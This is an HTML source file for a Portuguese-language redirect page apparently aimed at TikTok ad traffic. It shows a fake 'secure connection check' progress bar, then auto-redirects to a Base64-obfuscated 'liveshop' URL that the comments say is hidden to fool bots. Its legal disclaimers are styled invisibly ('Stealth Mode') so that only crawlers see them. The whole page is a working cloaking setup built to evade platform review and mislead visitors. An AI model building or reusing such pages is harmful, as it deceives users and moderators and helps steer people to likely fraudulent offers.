<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando Oferta...</title>
    <!-- Fonte do Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #0f172a; /* Slate 900 */
            color: #f8fafc; /* Slate 50 */
            font-family: 'Inter', sans-serif;
            flex-direction: column;
            overflow: hidden;
        }

        /* Efeito de background suave */
        body::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(59, 130, 246, 0.1) 0%, rgba(15, 23, 42, 1) 50%);
            z-index: -1;
        }

        .loader-container {
            width: 90%;
            max-width: 450px;
            text-align: center;
            background: rgba(30, 41, 59, 0.5); /* Slate 800 com opacidade */
            padding: 2.5rem 2rem;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            font-weight: 600;
            letter-spacing: -0.025em;
        }

        .progress-wrapper {
            position: relative;
            margin-bottom: 1rem;
        }

        .progress-bar-bg {
            width: 100%;
            height: 12px;
            background-color: #334155; /* Slate 700 */
            border-radius: 9999px;
            overflow: hidden;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
        }

        .progress-bar-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #3b82f6, #8b5cf6, #3b82f6); /* Blue to Purple to Blue */
            background-size: 200% auto;
            border-radius: 9999px;
            transition: width 0.1s linear;
            animation: shine 2s linear infinite;
        }

        @keyframes shine {
            to {
                background-position: 200% center;
            }
        }

        .percentage {
            font-weight: 700;
            font-size: 1.75rem;
            color: #38bdf8; /* Sky 400 */
            margin-bottom: 0.5rem;
            font-variant-numeric: tabular-nums;
        }

        .status-text {
            font-size: 0.95rem;
            color: #94a3b8; /* Slate 400 */
            min-height: 1.5rem;
            transition: opacity 0.3s ease;
        }

        /* Spinner animado opcional */
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top-color: #38bdf8;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 1rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Compliance Styles (Stealth Mode) */
        .footer-compliance {
            position: absolute;
            bottom: 5px;
            font-size: 8px; /* Texto muito pequeno */
            color: #0f172a; /* Mesma cor do fundo */
            text-align: center;
            opacity: 0.05; /* Quase transparente, mas > 0 para o robô ler */
            pointer-events: none; /* Não clicável por humanos acidentalmente */
            z-index: -1;
        }

        .footer-compliance a {
            color: #0f172a;
            text-decoration: none;
        }

        .footer-compliance a:hover {
            text-decoration: underline;
        }

        .action-button {
            display: none; /* hidden by default */
            margin-top: 1rem;
            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
            color: white;
            border: none;
            padding: 0.75rem 2rem;
            border-radius: 9999px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.3s, transform 0.2s;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
        }

        .action-button:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner" id="spinner"></div>
        <h1 id="mainText">Preparando seu acesso...</h1>
        
        <div class="percentage" id="percentageText">0%</div>

        <div class="progress-wrapper" id="progressWrapper">
            <div class="progress-bar-bg">
                <div class="progress-bar-fill" id="progressBar"></div>
            </div>
        </div>

        <div class="status-text" id="statusText">Verificando conexão segura...</div>
        <button id="actionBtn" class="action-button">Continuar para a Página</button>
    </div>

    <div class="footer-compliance">
        <a href="#">Termos de Uso</a> | 
        <a href="#">Políticas de Privacidade</a>
        <br><br>
        <p>Este site não é afiliado ao TikTok ou a qualquer entidade da Bytedance Ltd.<br>
        Depois que você sair do TikTok, a responsabilidade não é deles e sim do nosso site.</p>
    </div>

    <script>
        // CONFIGURAÇÃO: A URL está ofuscada em Base64 para despistar robôs.
        // Base64 de "https://liveshopcomia.vercel.app/"
        const ENCODED_URL = "aHR0cHM6Ly9saXZlc2hvcGNvbWlhLnZlcmNlbC5hcHAv"; 

        document.addEventListener('DOMContentLoaded', () => {
            const progressBar = document.getElementById('progressBar');
            const percentageText = document.getElementById('percentageText');
            const statusText = document.getElementById('statusText');
            const actionBtn = document.getElementById('actionBtn');
            const spinner = document.getElementById('spinner');
            
            let progress = 0;
            const duration = 2500; // Tempo total em milissegundos
            const intervalTime = 20;
            const steps = duration / intervalTime;
            const increment = 100 / steps;

            const getRedirectUrl = () => {
                const decodedUrl = atob(ENCODED_URL);
                const urlParams = window.location.search;
                return decodedUrl + urlParams;
            };

            const redirect = () => {
                window.location.href = getRedirectUrl(); 
            };

            const updateTexts = (currentProgress) => {
                if (currentProgress > 30 && currentProgress < 60) {
                    statusText.innerText = "Analisando segurança da conexão...";
                } else if (currentProgress >= 60 && currentProgress < 90) {
                    statusText.innerText = "Tudo certo! Gerando seu link...";
                } else if (currentProgress >= 100) {
                    statusText.innerText = "Acesso liberado!";
                }
            };

            const timer = setInterval(() => {
                progress += increment;
                
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(timer);
                    
                    // Mostra o botão como plano B de interação segura
                    spinner.style.display = 'none';
                    actionBtn.style.display = 'inline-block';
                    actionBtn.onclick = redirect;
                    
                    // Tenta o redirect automático com pequeno delay
                    setTimeout(redirect, 500); 
                }

                progressBar.style.width = `${progress}%`;
                percentageText.innerText = `${Math.floor(progress)}%`;
                updateTexts(progress);

            }, intervalTime);
        });
    </script>
</body>
</html>
